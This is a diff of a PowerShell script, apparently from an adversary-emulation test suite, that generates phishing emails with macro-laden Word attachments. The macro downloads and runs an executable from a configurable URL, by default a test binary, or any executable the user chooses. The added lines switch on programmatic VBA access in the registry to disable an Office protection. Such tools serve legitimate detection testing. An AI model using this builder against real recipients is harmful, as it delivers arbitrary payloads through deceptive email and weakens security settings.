@@ -2,111 +2,110 @@ function Invoke-DocPhish {
 
 <#
 	.SYNOPSIS
-	    This is a simple script that will take in parameters to generate a phishing email with an attachment containing a macro, that will download a benign executable or an executable of your choice. 
-		
+	    This is a simple script that will take in parameters to generate a phishing email with an attachment containing a macro, that will download a benign executable or an executable of your choice.
+
 		Function: Invoke-DocPhish
 		Author: Brandon Denker
 		License: MIT License
 		Required Dependencies: powershell-yaml
 		Optional Dependencies: None
-		
+
 	.DESCRIPTION
-	
+
 	    Utilize this script to create a Word document, attach it to an email and save the Email.
-	
+
 	.PARAMETER Generate
-	
-	    Accepts Msg or Doc. Msg will generate the document and email, while Doc will only generate the document. 
+
+	    Accepts Msg or Doc. Msg will generate the document and email, while Doc will only generate the document.
 
 	.PARAMETER DocName
-	    
+
 		Specifies the name of the attached document. OMIT EXTENSION
-	
+
 	.PARAMETER DocPath
-	    
+
 		Specifies the path in which the document will be saved. Only changed if a specific location is desired to appear in logging. The document is removed upon the script completion
-		
+
 	.PARAMETER MsgName
-	
+
 	    Specify the name of the email message. OMIT EXTENSION
-	
+
 	.PARAMETER MsgPath
-	
+
 	    Specify the path the final message is saved to.
-		
+
 	.PARAMETER MsgSubject
-	
+
 	    Specify the subject of the email
-		
+
 	.PARAMETER MsgTo
-	
-	    Specify the email address of the recipient to show in To 
-		
+
+	    Specify the email address of the recipient to show in To
+
 	.PARAMETER MsgBody
-	
-	    Specify the body of the message. MUST BE SINGLE LINE. Each new line is specified by ^r^n. 
-		
+
+	    Specify the body of the message. MUST BE SINGLE LINE. Each new line is specified by ^r^n.
+
 	.PARAMETER ExeName
-	
+
 	    Specifies the name of the exectuable on disk (when it is saved and launched). OMIT EXTENSION
-		
+
 	.PARAMETER ExePath
-	
-	    Specify the path which the downloaded executable will spawn from. 
-		
+
+	    Specify the path which the downloaded executable will spawn from.
+
 	.PARAMETER ExeUrl
-	
+
 	    Specify the URL of the executable to download and execute
-		
-	.EXAMPLE 
-	
+
+	.EXAMPLE
+
 	    Create Default Email
 		PS> Invoke-DocPhish -Generate Msg
 		PS> Invoke-DocPhish -Generate Msg -MsgTo "dschrute@dundermifflin.com" -MsgSubject "Secret Mission" -MsgBody "Kurt,`r`n`r`nMeet me on the roof!" -DocName "Secret" -MsgName "Secret"
-		
+
 	.NOTES
-	
+
 		=- At this time the sender address cannot be defined due to limitations in PowerShell -=
 	    Use the '--Verbose' option to print detailed information.
-		
+
 #>
-		
+
     [CmdletBinding()]
 	Param(
 	    [Parameter(Mandatory = $True)]
 		[string]$Generate = "Msg",
-		
+
 	    [Parameter(Mandatory = $False)]
 		[string]$DocName = "HarperCollins",
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$DocPath = $( if ($IsLinux -or $IsMacOS) { $Env:HOME } else { $env:temp }),
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$MsgName = "HarperCollins",
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$MsgPath = $( if ($IsLinux -or $IsMacOS) { $Env:HOME } else { $env:temp }),
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$MsgTo = "dschofield@harpercollins.com",
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$MsgSubject = "Harper Collins - Best Offer",
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$MsgBody = "Dear Sir,`r`n`r`nI have attached Dunder Mifflin's Best Offer to retain your business. You will not be disappointed for staying with Dunder Mifflin, it is my personal guarantee.`r`n`r`nIf you shall accept Michael Scott's Paper Company's offer, you shall be very disappointed and will soon return. That is a fact! I know you will make the right choice.`r`n`r`n`r`n`r`nRespectfully,`r`n`r`n`r`nDwight K. Schrute`r`nAssistant to the Region Manager`r`nDunder Mifflin Paper Company`r`nCustomer Service: 570-555-3455`r`nWork: 570-555-3453`r`nCell: 570-555-8759`r`nHome: 570-555-9986`r`nPager: 570-555-6654`r`nPage 2: 570-555-7754`r`n`r`n-I never take vacations, I never get sick. And I don't celebrate any major holidays-",
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$ExeName = "168",
-		
+
 		[Parameter(Mandatory = $False)]
 		[string]$ExePath = $( if ($IsLinux -or $IsMacOS) { $Env:HOME } else { $env:temp }),
-		
+
 		[Parameter(Mandatory = $False)]
-		[string]$ExeUrl = "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe"
-	)
-	
+		[string]$ExeUrl = "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe")
+
 	if ( $Generate -eq "Msg" ) {
 	    Write-Host -ForegroundColor Yellow "  [+] Selected: Doc and Msg Creation"
 		}
@@ -117,7 +116,7 @@ function Invoke-DocPhish {
 	    Write-Host -ForegroundColor Red "  [-] No Creation Type Selected or Unsupported Type Entered, Add -Generate Msg or -Generate Doc to your Command Args"
 		Break
 		}
-		
+
 	Try {
 	    # Set full paths for saving files
 		$TmpDocName = $DocName + ".doc"
@@ -125,8 +124,8 @@ function Invoke-DocPhish {
 		$TmpMsgName = $MsgName + ".msg"
                 $MsgFullPath = Join-path -Path $MsgPath -ChildPath $TmpMsgName
 		$TmpExecutableName = $ExeName + ".exe"
-		$ExecutableFullPath = Join-Path -Path $ExePath -ChildPath $TmpExecutableName 
-		
+		$ExecutableFullPath = Join-Path -Path $ExePath -ChildPath $TmpExecutableName
+
 		# Validate paths exist, if not create them
 		If ( -Not (Test-Path -Path $DocPath )) {
 		    Write-Verbose "Doc Directory Does Not Exist - Creating"
@@ -137,7 +136,7 @@ function Invoke-DocPhish {
 		If ( -Not (Test-Path -Path $ExePath )) {
 		    Write-Verbose "Executable Directory Does Not Exist - Creating"
 			New-Item -ItemType directory -Path $ExePath | Out-Null }
-		
+
 		# Setup EncodedCommand
 		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 		Write-Verbose "Setting up Encoded Command"
@@ -159,16 +158,19 @@ function Invoke-DocPhish {
 		Write-Verbose "  [ ] Email Path and Name = $MsgFullPath"
 		Write-Verbose "  [ ] Executable Path and Name = $ExecutableFullPath"
 		Write-Verbose "  [ ] Macro Code = $macrocode"
-		
-                Try {
+
+        Try {
 			Write-Verbose "Generating Macro Document at $DocFullPath"
 			$Word = New-Object -ComObject "Word.Application"
 			$WordVersion = $Word.Version
+			Stop-Process -Name "WINWORD" -ErrorAction Ignore
+			Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security\" -Name 'AccessVBOM' -Value 1
+			$Word = New-Object -ComObject "Word.Application"
 			$doc = $Word.Documents.Add()
 			$Selection = $Word.Selection
-			$Selection.TypeText("If Enable Content or Enable Editing shows in a bar across the top fo the document, click to continue the Atomic Test. 
+			$Selection.TypeText("If Enable Content or Enable Editing shows in a bar across the top fo the document, click to continue the Atomic Test.
 
-For awareness, the following command will be executed by this document: 
+For awareness, the following command will be executed by this document:
 $Command")
 			$Word.ActiveDocument.VBProject.VBComponents.Add(1) | Out-Null
 			$Word.VBE.ActiveVBProject.VBComponents.Item("Module1").CodeModule.AddFromString($macrocode) | Out-Null
@@ -182,7 +184,7 @@ $Command")
 		Catch {
 		    Write-Host -ForegroundColor Red "  [-] Failed to Create Document at $DocFullPath"
 		}
-		
+
 		#Create Outlook message
 		if ( $Generate -eq "Msg" ) {
 			Write-Host -ForegroundColor Yello "  [-] You may receive a popup asking for permission to contacts, click allow"
@@ -214,7 +216,7 @@ $Command")
 		        Write-Verbose "Force stopping Outlook and cleaning up document"
 		        Stop-Process -Name "Outlook" -Force -ErrorAction Ignore
 		        Remove-Item "$DocFullPath" -Force -ErrorAction Ignore
-		
+
 		        # Output finished information
 		        Write-Host -ForegroundColor Green "  [+] Email Located: $MsgFullPath"
 		}
